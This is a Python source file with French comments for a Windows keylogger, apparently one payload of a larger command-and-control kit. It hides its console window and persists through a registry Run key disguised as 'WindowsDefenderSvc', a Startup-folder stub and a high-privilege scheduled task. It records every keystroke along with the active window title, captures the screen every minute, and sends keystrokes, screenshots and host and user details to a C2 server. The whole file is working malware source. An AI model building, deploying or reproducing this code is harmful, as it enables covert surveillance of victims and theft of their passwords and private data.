#!/usr/bin/env python3
"""
payloads/keylogger_win.py
Keylogger Windows compilable en .exe via PyInstaller.
- Tourne en arrière-plan (pas de fenêtre)
- Capture TOUTES les frappes sur tout le PC
- Envoie au C2 toutes les 30s
- S'installe en persistence automatiquement
- Se cache dans les processus système
"""

import threading
import datetime
import platform
import socket
import os
import sys
import json
import time
import winreg
import ctypes
import string
import subprocess
import urllib.request
from pathlib import Path

# ── config — ces valeurs sont remplacées par server_v2.py ──
C2     = "http://FILL_C2_HOST:FILL_PORT"
BOT_ID = socket.gethostname()

# ── se cacher ─────────────────────────────────────────────
def hide():
    """Cacher la fenêtre console."""
    if platform.system() == "Windows":
        try:
            # Cacher la fenêtre
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except Exception:
            pass

# ── persistence ───────────────────────────────────────────
def install_persistence():
    """S'ajouter au démarrage Windows."""
    exe_path = sys.executable if getattr(sys, "frozen", False) \
               else os.path.abspath(__file__)
    methods  = []

    # 1. Registre HKCU Run
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(
            key, "WindowsDefenderSvc", 0,
            winreg.REG_SZ, exe_path,
        )
        winreg.CloseKey(key)
        methods.append("registry_run")
    except Exception:
        pass

    # 2. Dossier Startup
    try:
        startup = Path(os.environ.get("APPDATA", "")) / \
                  "Microsoft/Windows/Start Menu/Programs/Startup"
        if startup.exists():
            stub = startup / "svchost_helper.pyw"
            stub.write_text(
                f"import subprocess\n"
                f"subprocess.Popen([r'{exe_path}'],"
                f"creationflags=0x08000000)\n"
            )
            methods.append("startup_folder")
    except Exception:
        pass

    # 3. Scheduled task
    try:
        subprocess.run(
            f'schtasks /create /sc onlogon /tn "WindowsSecSvc" '
            f'/tr "{exe_path}" /f /rl highest',
            shell=True, capture_output=True,
        )
        methods.append("schtasks")
    except Exception:
        pass

    return methods

# ── envoi C2 ─────────────────────────────────────────────
def _post(url: str, data: dict):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def register():
    _post(f"{C2}/c2/register", {
        "id":   BOT_ID,
        "os":   platform.platform(),
        "user": os.getlogin(),
        "type": "keylogger_win",
    })

# ── keylogger principal ──────────────────────────────────
BUFFER     = []
LOCK       = threading.Lock()
WIN_TITLES = {}  # suivi de la fenêtre active

def get_active_window():
    """Récupérer le titre de la fenêtre active."""
    try:
        hwnd   = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf    = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    except Exception:
        return "unknown"

def flush_buffer():
    """Envoyer le buffer au C2."""
    while True:
        time.sleep(30)
        with LOCK:
            if not BUFFER:
                continue
            data = list(BUFFER)
            BUFFER.clear()
        _post(f"{C2}/c2/result/{BOT_ID}", {
            "result": f"[KEYLOG]\n" + "".join(
                f"[{e['window']}] {e['key']}\n" for e in data
            )
        })

def keylogger_pynput():
    """Keylogger via pynput (meilleur)."""
    try:
        from pynput import keyboard

        SPECIAL = {
            "space":     " ",
            "enter":     "\n",
            "backspace": "[⌫]",
            "tab":       "[TAB]",
            "delete":    "[DEL]",
            "escape":    "[ESC]",
            "caps_lock": "[CAPS]",
            "ctrl_l":    "[CTRL]",
            "ctrl_r":    "[CTRL]",
            "alt_l":     "[ALT]",
            "alt_r":     "[ALT]",
            "shift":     "",
            "shift_r":   "",
            "cmd":       "[WIN]",
        }

        def on_press(key):
            window = get_active_window()
            try:
                char = key.char or ""
            except AttributeError:
                name = str(key).replace("Key.", "")
                char = SPECIAL.get(name, f"[{name}]")
            with LOCK:
                BUFFER.append({
                    "key":    char,
                    "window": window[:60],
                    "ts":     datetime.datetime.now().strftime(
                        "%H:%M:%S"
                    ),
                })

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    except ImportError:
        keylogger_ctypes()

def keylogger_ctypes():
    """Fallback : keylogger via GetAsyncKeyState."""
    VK_MAP = {}
    for c in string.ascii_uppercase:
        VK_MAP[ord(c)] = c.lower()
    for d in string.digits:
        VK_MAP[ord(d)] = d
    VK_MAP.update({
        0x20: " ",   0x0D: "\n",  0x08: "[⌫]",
        0x09: "[TAB]",0x2E:"[DEL]",0x1B: "[ESC]",
        0xBE: ".",   0xBC: ",",   0xBF: "/",
        0xBA: ";",   0xBB: "=",   0xBD: "-",
        0xDB: "[",   0xDD: "]",   0xDC: "\\",
        0xDE: "'",   0xC0: "`",
    })
    pressed = set()
    while True:
        window = get_active_window()
        for vk, char in VK_MAP.items():
            state = ctypes.windll.user32.GetAsyncKeyState(vk)
            if state & 0x8000:
                if vk not in pressed:
                    pressed.add(vk)
                    with LOCK:
                        BUFFER.append({
                            "key":    char,
                            "window": window[:60],
                            "ts":     datetime.datetime.now()
                                      .strftime("%H:%M:%S"),
                        })
            else:
                pressed.discard(vk)
        time.sleep(0.01)

# ── screenshot périodique ────────────────────────────────
def screenshot_loop():
    """Screenshot toutes les 60s."""
    try:
        import base64, io
        from PIL import ImageGrab
        while True:
            time.sleep(60)
            try:
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=50)
                b64 = base64.b64encode(buf.getvalue()).decode()
                _post(f"{C2}/frame", {
                    "type":  "screen_keylogger",
                    "frame": f"data:image/jpeg;base64,{b64}",
                    "ts":    datetime.datetime.now().isoformat(),
                    "ua":    f"Windows/{BOT_ID}",
                })
            except Exception:
                pass
    except ImportError:
        pass

# ── main ──────────────────────────────────────────────────
if __name__ == "__main__":
    hide()
    register()
    install_persistence()

    # Flush thread
    threading.Thread(target=flush_buffer, daemon=True).start()

    # Screenshot thread
    threading.Thread(target=screenshot_loop, daemon=True).start()

    # Keylogger principal
    keylogger_pynput()